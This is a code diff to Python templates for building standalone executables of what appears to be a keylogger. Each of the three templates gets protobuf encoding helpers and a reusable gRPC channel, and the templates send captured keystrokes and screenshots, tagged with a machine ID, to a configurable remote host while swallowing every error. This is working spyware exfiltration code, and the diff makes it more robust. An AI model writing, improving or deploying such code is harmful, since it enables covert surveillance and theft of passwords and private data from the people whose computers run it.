@@ -382,6 +382,7 @@ if __name__ == "__main__":
 # STANDALONE EXE SCRIPT TEMPLATES
 # These templates embed all necessary code for standalone executables
 # that don't require the libs folder at runtime.
+# Uses manual protobuf wire format encoding for minimal dependencies.
 # ============================================
 
 STANDALONE_WIN_ADVANCED_TEMPLATE = '''
@@ -397,7 +398,46 @@ import time
 import tempfile
 import hashlib
 import platform as plat
+import struct
 from datetime import datetime
+
+# ============ Protobuf Wire Format Helpers ============
+def encode_varint(value):
+    """Encode an integer as a varint."""
+    bits = value & 0x7f
+    value >>= 7
+    result = b""
+    while value:
+        result += bytes([0x80 | bits])
+        bits = value & 0x7f
+        value >>= 7
+    result += bytes([bits])
+    return result
+
+def encode_string(field_number, value):
+    """Encode a string field in protobuf wire format."""
+    if isinstance(value, str):
+        value = value.encode('utf-8')
+    tag = (field_number << 3) | 2  # wire type 2 = length-delimited
+    return encode_varint(tag) + encode_varint(len(value)) + value
+
+def encode_bytes(field_number, value):
+    """Encode a bytes field in protobuf wire format."""
+    tag = (field_number << 3) | 2  # wire type 2 = length-delimited
+    return encode_varint(tag) + encode_varint(len(value)) + value
+
+def build_keylog_request(message):
+    """Build KeylogRequest protobuf message. Field 1 = message (string)."""
+    return encode_string(1, message)
+
+def build_screenshot_request(image_data, filename, timestamp, client_id):
+    """Build ScreenshotRequest protobuf message."""
+    # Field 1 = image_data (bytes), Field 2 = filename, Field 3 = timestamp, Field 4 = client_id
+    msg = encode_bytes(1, image_data)
+    msg += encode_string(2, filename)
+    msg += encode_string(3, timestamp)
+    msg += encode_string(4, client_id)
+    return msg
 
 # ============ gRPC Client (embedded) ============
 try:
@@ -410,21 +450,37 @@ except ImportError:
 _host = "{host}"
 _port = {port}
 _client_id = None
+_channel = None
+_keylog_stub = None
+_screenshot_stub = None
 
 def _generate_client_id():
     info = f"{{plat.node()}}-{{plat.system()}}-{{plat.machine()}}"
     return hashlib.md5(info.encode()).hexdigest()[:12]
 
+def _ensure_channel():
+    global _channel, _keylog_stub, _screenshot_stub
+    if _channel is None and HAS_GRPC:
+        _channel = grpc.insecure_channel(f"{{_host}}:{{_port}}")
+        _keylog_stub = _channel.unary_unary(
+            '/KeylogService/SendKeylog',
+            request_serializer=lambda x: x,
+            response_deserializer=lambda x: x
+        )
+        _screenshot_stub = _channel.unary_unary(
+            '/KeylogService/SendScreenshot',
+            request_serializer=lambda x: x,
+            response_deserializer=lambda x: x
+        )
+
 def send_key_grpc(text):
     if not HAS_GRPC:
         return
     try:
-        channel = grpc.insecure_channel(f"{{_host}}:{{_port}}")
-        channel.unary_unary(
-            '/KeylogService/SendKeylog',
-            request_serializer=lambda x: x,
-            response_deserializer=lambda x: x
-        )(text.encode())
+        _ensure_channel()
+        # Build proper protobuf message
+        msg = build_keylog_request(text)
+        _keylog_stub(msg)
     except Exception:
         pass
 
@@ -443,15 +499,10 @@ def send_screenshot_grpc(filepath):
         if _client_id is None:
             _client_id = _generate_client_id()
         
-        header = f"{{_client_id}}|{{filename}}|{{timestamp}}|".encode()
-        message = header + data
-        
-        channel = grpc.insecure_channel(f"{{_host}}:{{_port}}")
-        channel.unary_unary(
-            '/KeylogService/SendScreenshot',
-            request_serializer=lambda x: x,
-            response_deserializer=lambda x: x
-        )(message)
+        _ensure_channel()
+        # Build proper protobuf message
+        msg = build_screenshot_request(data, filename, timestamp, _client_id)
+        _screenshot_stub(msg)
     except Exception:
         pass
 
@@ -570,7 +621,45 @@ import time
 import tempfile
 import hashlib
 import platform as plat
+import struct
 from datetime import datetime
+
+# ============ Protobuf Wire Format Helpers ============
+def encode_varint(value):
+    """Encode an integer as a varint."""
+    bits = value & 0x7f
+    value >>= 7
+    result = b""
+    while value:
+        result += bytes([0x80 | bits])
+        bits = value & 0x7f
+        value >>= 7
+    result += bytes([bits])
+    return result
+
+def encode_string(field_number, value):
+    """Encode a string field in protobuf wire format."""
+    if isinstance(value, str):
+        value = value.encode('utf-8')
+    tag = (field_number << 3) | 2  # wire type 2 = length-delimited
+    return encode_varint(tag) + encode_varint(len(value)) + value
+
+def encode_bytes(field_number, value):
+    """Encode a bytes field in protobuf wire format."""
+    tag = (field_number << 3) | 2  # wire type 2 = length-delimited
+    return encode_varint(tag) + encode_varint(len(value)) + value
+
+def build_keylog_request(message):
+    """Build KeylogRequest protobuf message. Field 1 = message (string)."""
+    return encode_string(1, message)
+
+def build_screenshot_request(image_data, filename, timestamp, client_id):
+    """Build ScreenshotRequest protobuf message."""
+    msg = encode_bytes(1, image_data)
+    msg += encode_string(2, filename)
+    msg += encode_string(3, timestamp)
+    msg += encode_string(4, client_id)
+    return msg
 
 # ============ gRPC Client (embedded) ============
 try:
@@ -582,21 +671,36 @@ except ImportError:
 _host = "{host}"
 _port = {port}
 _client_id = None
+_channel = None
+_keylog_stub = None
+_screenshot_stub = None
 
 def _generate_client_id():
     info = f"{{plat.node()}}-{{plat.system()}}-{{plat.machine()}}"
     return hashlib.md5(info.encode()).hexdigest()[:12]
 
+def _ensure_channel():
+    global _channel, _keylog_stub, _screenshot_stub
+    if _channel is None and HAS_GRPC:
+        _channel = grpc.insecure_channel(f"{{_host}}:{{_port}}")
+        _keylog_stub = _channel.unary_unary(
+            '/KeylogService/SendKeylog',
+            request_serializer=lambda x: x,
+            response_deserializer=lambda x: x
+        )
+        _screenshot_stub = _channel.unary_unary(
+            '/KeylogService/SendScreenshot',
+            request_serializer=lambda x: x,
+            response_deserializer=lambda x: x
+        )
+
 def send_key_grpc(text):
     if not HAS_GRPC:
         return
     try:
-        channel = grpc.insecure_channel(f"{{_host}}:{{_port}}")
-        channel.unary_unary(
-            '/KeylogService/SendKeylog',
-            request_serializer=lambda x: x,
-            response_deserializer=lambda x: x
-        )(text.encode())
+        _ensure_channel()
+        msg = build_keylog_request(text)
+        _keylog_stub(msg)
     except Exception:
         pass
 
@@ -615,15 +719,9 @@ def send_screenshot_grpc(filepath):
         if _client_id is None:
             _client_id = _generate_client_id()
         
-        header = f"{{_client_id}}|{{filename}}|{{timestamp}}|".encode()
-        message = header + data
-        
-        channel = grpc.insecure_channel(f"{{_host}}:{{_port}}")
-        channel.unary_unary(
-            '/KeylogService/SendScreenshot',
-            request_serializer=lambda x: x,
-            response_deserializer=lambda x: x
-        )(message)
+        _ensure_channel()
+        msg = build_screenshot_request(data, filename, timestamp, _client_id)
+        _screenshot_stub(msg)
     except Exception:
         pass
 
@@ -758,7 +856,45 @@ import tempfile
 import subprocess
 import hashlib
 import platform as plat
+import struct
 from datetime import datetime
+
+# ============ Protobuf Wire Format Helpers ============
+def encode_varint(value):
+    """Encode an integer as a varint."""
+    bits = value & 0x7f
+    value >>= 7
+    result = b""
+    while value:
+        result += bytes([0x80 | bits])
+        bits = value & 0x7f
+        value >>= 7
+    result += bytes([bits])
+    return result
+
+def encode_string(field_number, value):
+    """Encode a string field in protobuf wire format."""
+    if isinstance(value, str):
+        value = value.encode('utf-8')
+    tag = (field_number << 3) | 2  # wire type 2 = length-delimited
+    return encode_varint(tag) + encode_varint(len(value)) + value
+
+def encode_bytes(field_number, value):
+    """Encode a bytes field in protobuf wire format."""
+    tag = (field_number << 3) | 2  # wire type 2 = length-delimited
+    return encode_varint(tag) + encode_varint(len(value)) + value
+
+def build_keylog_request(message):
+    """Build KeylogRequest protobuf message. Field 1 = message (string)."""
+    return encode_string(1, message)
+
+def build_screenshot_request(image_data, filename, timestamp, client_id):
+    """Build ScreenshotRequest protobuf message."""
+    msg = encode_bytes(1, image_data)
+    msg += encode_string(2, filename)
+    msg += encode_string(3, timestamp)
+    msg += encode_string(4, client_id)
+    return msg
 
 # ============ gRPC Client (embedded) ============
 try:
@@ -770,21 +906,36 @@ except ImportError:
 _host = "{host}"
 _port = {port}
 _client_id = None
+_channel = None
+_keylog_stub = None
+_screenshot_stub = None
 
 def _generate_client_id():
     info = f"{{plat.node()}}-{{plat.system()}}-{{plat.machine()}}"
     return hashlib.md5(info.encode()).hexdigest()[:12]
 
+def _ensure_channel():
+    global _channel, _keylog_stub, _screenshot_stub
+    if _channel is None and HAS_GRPC:
+        _channel = grpc.insecure_channel(f"{{_host}}:{{_port}}")
+        _keylog_stub = _channel.unary_unary(
+            '/KeylogService/SendKeylog',
+            request_serializer=lambda x: x,
+            response_deserializer=lambda x: x
+        )
+        _screenshot_stub = _channel.unary_unary(
+            '/KeylogService/SendScreenshot',
+            request_serializer=lambda x: x,
+            response_deserializer=lambda x: x
+        )
+
 def send_key_grpc(text):
     if not HAS_GRPC:
         return
     try:
-        channel = grpc.insecure_channel(f"{{_host}}:{{_port}}")
-        channel.unary_unary(
-            '/KeylogService/SendKeylog',
-            request_serializer=lambda x: x,
-            response_deserializer=lambda x: x
-        )(text.encode())
+        _ensure_channel()
+        msg = build_keylog_request(text)
+        _keylog_stub(msg)
     except Exception:
         pass
 
@@ -803,15 +954,9 @@ def send_screenshot_grpc(filepath):
         if _client_id is None:
             _client_id = _generate_client_id()
         
-        header = f"{{_client_id}}|{{filename}}|{{timestamp}}|".encode()
-        message = header + data
-        
-        channel = grpc.insecure_channel(f"{{_host}}:{{_port}}")
-        channel.unary_unary(
-            '/KeylogService/SendScreenshot',
-            request_serializer=lambda x: x,
-            response_deserializer=lambda x: x
-        )(message)
+        _ensure_channel()
+        msg = build_screenshot_request(data, filename, timestamp, _client_id)
+        _screenshot_stub(msg)
     except Exception:
         pass
 
